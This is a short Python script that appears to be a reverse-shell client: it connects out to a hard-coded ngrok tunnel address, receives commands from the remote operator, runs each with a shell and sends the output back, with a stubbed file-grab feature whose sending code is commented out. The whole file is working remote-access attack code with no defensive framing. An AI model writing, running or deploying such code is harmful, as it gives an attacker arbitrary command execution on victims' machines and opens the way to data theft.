# -------- name --------
name = "HDlp"
# ----------------------
import time
import re
import os
import socket
import subprocess as sp

host = '0.tcp.ngrok.io'
port = 11999
headerLength = 100
# os.system('clear')

# recive msg for variable length
def recv(serv):
    # msg = "-"
    msg = serv.recv(headerLength).decode()
    # msg += '-'
    n = int(msg)
    msg = serv.recv(n).decode()
    return msg


# send message with header (size of msg)
def send(serv, msg):
    msg = f'{len(str(msg)):<{headerLength}}{msg}'
    serv.send(msg.encode())


# to remove flags and get input
# def fetchResults(cmd):
#     return re.split(r' -[\w]* ', cmd)[1:]


def isvalid(fnm):
    present = 0
    for _, _, file in os.walk(os.getcwd()):
        if fnm in file:
            present=1
            break
        break

    if present == 1:
        return os.path.getsize(fnm)
    return False
        
def sendFile(fnm):
    # try:
    #     fnm = os.getcwd()+'/'+fnm
    #     fsize = os.path.getsize(fnm)
    #     send(serv, fsize)

    #     with open(fnm, 'rb') as file:
    #         chars = file.read()
    #         send(serv, chars)


    # except Exception as e:
    #     print(e)
    pass
        


# start
try:
    serv = socket.socket()
    serv.connect((host, port))
    while True:
        msg = recv(serv)
        op = ''
        if msg == 'exit':
            continue
        elif re.match(r"^(sudo\s)?cd .*$", msg):
            try:
                os.chdir(msg[3:])
                op = 'Directory changed to - ' + sp.check_output('pwd', shell=True).decode()
            except:
                op = 'Invalid filepath'
        elif re.match(r'^(sudo)?cd$', msg):
            try:
                os.chdir(os.path.expanduser('~'))
                op = 'Directory changed to - ' + sp.check_output('pwd', shell=True).decode()
            except:
                op = 'Invalid filepath'
        elif (msg == 'hello'):
            send(serv, name)
            continue
        elif re.match(r'^get .*',msg):
            fnm = msg[4:]
            fileisvalid = isvalid(fnm)
            if fileisvalid:
                send(serv, 'The size of the file is '+str(format(fileisvalid/1024, '.2f'))+'KB (' + str(format(fileisvalid/(1024*1024), '.4f')) + 'MB)')
                msg = recv(serv)
                if 'y' in msg.lower():
                    # sendFile(fnm)
                    pass
                else:
                    continue
            elif fileisvalid == False:
                send(serv, '-1')
            continue
        else:
            try:
                op = sp.check_output(msg, shell=True).decode()
            except Exception as e:
                op = 'Invalid Command'

        if op == '':
            op = 'Command Executed'

        # serv.send(op)
        send(serv, op)
finally:
    serv.close()
